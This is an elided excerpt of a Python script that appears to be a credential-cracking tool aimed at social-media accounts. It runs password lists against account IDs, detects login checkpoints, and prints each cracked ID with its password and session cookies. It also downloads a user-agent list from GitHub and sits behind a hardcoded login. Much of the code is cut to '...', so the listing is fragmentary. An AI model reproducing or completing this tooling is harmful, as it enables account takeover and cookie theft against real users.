...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mYUBIN')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/YUBIN-XD.txt').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'YUBIN' and password == 'SAHISTHA':
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/YUBIN.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[😻SAHISTHA😻] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#YUBIN-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•YUBIN-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#YUBIN-King
				print(f'\r\033[0;92m[YUBIN-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " YUBIN,  Ok,  id"')
